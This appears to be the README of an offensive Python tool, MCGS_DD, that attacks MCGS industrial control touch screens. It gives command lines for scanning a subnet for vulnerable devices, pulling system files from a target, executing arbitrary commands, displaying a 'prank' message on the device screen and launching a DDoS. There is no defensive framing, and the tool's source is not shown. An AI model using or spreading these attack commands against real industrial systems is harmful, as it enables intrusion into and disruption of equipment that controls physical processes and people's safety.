  <div align="center">
 <p align="center">
 <img title="MCGS" src='https://img.shields.io/badge/MCGS_DDOS-1.0.0-brightgreen.svg' />
 <img title="MCGS" src='https://img.shields.io/badge/Python-3.9-yellow.svg' />
  <img title="MCGS" src='https://img.shields.io/badge/HackerTool-x' />
 <img title="MCGS" src='https://img.shields.io/static/v1?label=Author&message=@Martin&color=red'/>
 <img title="MCGS" src='https://img.shields.io/badge/-Linux-F16061?logo=linux&logoColor=000'/>
 <img title="MCGS" src='https://img.shields.io/badge/-Windows-F16061?logo=windows&logoColor=000'/> 
</p>

   
 <table>
  <tr>
      <th>Function</th>
  </tr>
  <tr>
    <th>
        Attack industrial network devices MCGS
    </th>
    
  </tr>
 </table>
</div>

# industrial control equipment

  ![图片名称](https://github.com/MartinxMax/MCGS_DD/blob/master/PT/mcgs.png)  

  ![图片名称](https://github.com/MartinxMax/MCGS_DD/blob/master/PT/mcgs2.png)  


# usage method
  * View help information

      ```#python3 MCGS_DD.py -h```

  ![图片名称](https://github.com/MartinxMax/MCGS_DD/blob/master/PT/help.png)  

# Scan for vulnerabilities in the internal network of industrial control devices (MCGS touch screen)

  ```#python3 MCGS_DD.py -scan 192.168.100.0/24```

  ![图片名称](https://github.com/MartinxMax/MCGS_DD/blob/master/PT/scan.png)  

# Attack industrial control devices and obtain device system files

```#python3 MCGS_DD.py -rh 192.168.100.3```

  ![图片名称](https://github.com/MartinxMax/MCGS_DD/blob/master/PT/result.png)  
  
# Arbitrary command execution

```#python3 MCGS_DD.py -rh 192.168.100.3 -cmd ipconfig```
  
![图片名称](https://github.com/MartinxMax/MCGS_DD/blob/master/PT/ipconfig.png)  

_PS:You can use the (- echo) parameter to print the results on the MCGS touch screen, which is a prank_

```#python3 MCGS_DD.py -rh 192.168.100.3 -cmd Martin_Hacking...........[X_X] -echo```
  
![图片名称](https://github.com/MartinxMax/MCGS_DD/blob/master/PT/hacking.png)  

# DDOS attacks

```#python3 MCGS_DD.py -rh 192.168.100.3 -cmd Martin_Hacking...........[X_X] -echo -dd```
  
![图片名称](https://github.com/MartinxMax/MCGS_DD/blob/master/PT/ddos.png)  
